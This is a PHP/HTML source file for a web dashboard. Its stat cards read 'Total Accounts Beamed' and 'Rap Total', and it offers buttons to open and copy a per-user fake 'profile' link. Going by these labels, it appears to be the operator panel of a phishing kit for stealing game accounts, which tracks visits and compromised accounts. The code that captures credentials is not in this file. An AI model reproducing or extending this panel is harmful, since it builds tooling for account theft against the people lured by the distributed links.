<?php
session_start();
if(!$_SESSION['authkey']) {
    die(header('location: sign-in'));
} else {
    $authkey = $_SESSION['authkey'];
    $siteid = file_get_contents('../tokens/'.$authkey.'.txt');
    $totalVisitor = file_get_contents('../tokens/'.$siteid.'/setup/totalvisitor.txt');
}
?>
<?php include("Admin/termed.php"); ?>
<html lang="en" class="perfect-scrollbar-on"><head>
<title>Dashboard | Page</title>
<link rel="shortcut icon" href="assets/img/icon.png" type="image/x-icon">

<meta charset="utf-8">
<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">


<link href="https://fonts.googleapis.com/css?family=Poppins:200,300,400,600,700,800" rel="stylesheet">
<link href="https://use.fontawesome.com/releases/v5.0.6/css/all.css" rel="stylesheet">

<link href="assets/cap.css" rel="stylesheet">
<link href="assets/demo/demo.css?" rel="stylesheet">
<link href="assets/css/nucleo-icons.css" rel="stylesheet">
<link href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-dark@4/dark.css" rel="stylesheet">

<link href="assets/font-awesome/css/fontawesome.css" rel="stylesheet">
<link href="assets/font-awesome/css/brands.css" rel="stylesheet">
<link href="assets/font-awesome/css/solid.css" rel="stylesheet">
<style type="text/css">/* Chart.js */
@-webkit-keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}@keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}.chartjs-render-monitor{-webkit-animation:chartjs-render-animation 0.001s;animation:chartjs-render-animation 0.001s;}</style><script type="text/javascript" charset="UTF-8" src="https://maps.googleapis.com/maps-api-v3/api/js/53/12/common.js"></script><script type="text/javascript" charset="UTF-8" src="https://maps.googleapis.com/maps-api-v3/api/js/53/12/util.js"></script></head>
<body>
<div class="wrapper">
<div class="full-page">
<div class="main-panel ps">
<nav class="navbar navbar-expand-lg navbar-transparent navbar-absolute fixed-top">
<div class="container-fluid">
<div class="navbar-wrapper">
<a class="navbar-brand" href="#"><?php echo $name ?></a>
</div>
<div class="collapse navbar-collapse justify-content-end">
<ul class="navbar-nav">
<li class="nav-item">
<a class="nav-link" href="logout.php">
<i class="fa-solid fa-lock fa-shake"></i> Log out</a>
</li>

</ul>
</div>
</div>
</nav>
<div class="content">
<div class="container">
<div class="row">
<div class="col-lg-10">
<div class="card">
<div class="card-body text-center">
<a style="color: white">Hallo <i>User</i> welcome to website Dashboard,
enjoy</a>
</div>
<div class="card-body text-center">
<button class="btn btn-success animation-on-hover btn-sm" type="button" rel="tooltip" data-original-title="I'm special!" data-placement="bottom" fdprocessedid="wka7un" onclick="Open('https://<?=$_SERVER['SERVER_NAME'];?>/users/<?=$siteid;?>/profile');">
Open Profile Theme
<i class="fa-solid fa-user fa-bounce"></i>
</button>
<button class="btn btn-warning animation-on-hover btn-sm" type="button" rel="tooltip" data-original-title="I'm special!" data-placement="bottom" fdprocessedid="wka7un" onclick="Copy(this, 'ProfileURL');">
Copy Profile Theme
<i class="fa-solid fa-user-group fa-bounce"></i>
</button>
</div>
</div>
</div>
</div>
<div class="row">
<div class="col-lg-4 col-md-6">
<div class="card card-stats">
<div class="card-body">
<div class="row">
<div class="col-5">
<div class="info-icon text-center icon-success">
<i class="tim-icons icon-single-02"></i>
</div>
</div>
<div class="col-7">
<div class="numbers">
<p class="card-category">Total Visit</p>
<h3 class="card-title"><?php echo $totalVisitor ?></h3>
</div>
</div>
</div>
</div>
<div class="card-footer">
<hr>
<div class="stats">
<i class="tim-icons icon-notes"></i> Total Visit
</div>
</div>
</div>
</div>
<div class="col-lg-3 col-md-6">
<div class="card card-stats">
<div class="card-body">
<div class="row">
<div class="col-5">
<div class="info-icon text-center icon-warning">
<i class="tim-icons icon-wallet-43"></i>
</div>
</div>
<div class="col-7">
<div class="numbers">
<p class="card-category">Beams Total</p>
<h3 class="card-title"><?php echo $totalVisitor ?></h3>
</div>
</div>
</div>
</div>
<div class="card-footer">
<hr>
<div class="stats">
<i class="tim-icons icon-shape-star"></i> Total Accounts Beamed
</div>
</div>
</div>
</div>
<div class="col-lg-3 col-md-6">
<div class="card card-stats">
<div class="card-body">
<div class="row">
<div class="col-5">
<div class="info-icon text-center icon-primary">
<i class="tim-icons icon-bank"></i>
</div>
</div>
<div class="col-7">
<div class="numbers">
<p class="card-category">Rap Total</p>
<h3 class="card-title">0</h3>
</div>
</div>
</div>
</div>
<div class="card-footer">
<hr>
<div class="stats">
<i class="tim-icons icon-trophy"></i> Total rap earn
</div>
</div>
</div>
</div>
</div>
<div class="row">
<div class="col-lg-10">
<div class="card">
<div class="card-body text-center text-white">
<input type="text" id="ProfileURL" class="form-control" value="https://<?=$_SERVER['SERVER_NAME'];?>/users/<?=$siteid;?>/profile" disabled=""> 
</div>
</div>
</div>
</div>
<div class="row">
<div class="col-lg-10">
<div class="card">
<div class="card-body">
<center>
<div class="container-fluid">
<div class="copyright float-center">
©
<script type="text/javascript">
                  document.write(new Date().getFullYear());
                </script>
, made with <i class="fa-solid fa-heart-pulse fa-bounce"></i> by
<a href="" target="_blank"><?php echo $name ?></a>
</center>
</div>
</div>
</div>
</div>
</div>
</div>
<footer class="footer">
</div>

</div>
</footer>
<div class="ps__rail-x" style="left: 0px; bottom: 0px;"><div class="ps__thumb-x" tabindex="0" style="left: 0px; width: 0px;"></div></div><div class="ps__rail-y" style="top: 0px; right: 0px;"><div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div></div></div>
</div>
</div>
<input name="challenge" id="challenge" value="WkVYeTdnQWhzdUFRWEx5cHR0T3dKUT09" type="hidden">

<script src="assets/js/core/jquery.min.js" type="text/javascript"></script>
<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.js" type="text/javascript"></script>
<script src="assets/js/core/popper.min.js" type="text/javascript"></script>
<script src="assets/js/core/bootstrap.min.js" type="text/javascript"></script>
<script src="assets/js/plugins/perfect-scrollbar.jquery.min.js" type="text/javascript"></script>
<script src="assets/main.min.js?" type="text/javascript"></script>

<script src="https://maps.googleapis.com/maps/api/js?key=YOUR_KEY_HERE" type="text/javascript"></script>

<script src="assets/js/plugins/chartjs.min.js" type="text/javascript"></script>

<script src="assets/js/plugins/bootstrap-notify.js" type="text/javascript"></script>

<script src="assets/js/black-dashboard.js?v=1.0.0" type="text/javascript"></script>
<script>
	    function Open(a){
	        window.open(a);
	    }
	    function Copy(a,b){
            var copyText = document.getElementById(b);
            copyText.select();
            copyText.setSelectionRange(0, 99999); // For mobile devices
            navigator.clipboard.writeText(copyText.value);
            
            a.innerHTML = "Copied!";
            setTimeout(function(){
                a.innerHTML = "Copy Profile Theme"
            }, 750)
	    }
	    setInterval(function(){
	        var l_doc = document.getElementsByClassName("text-warning");
	        l_doc[1].innerHTML = "&#129352;";
	        l_doc[2].innerHTML = "&#129353;";
	    }, 250);
	</script>
	<script src="apis/main.js"></script>
	<script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
</body></html>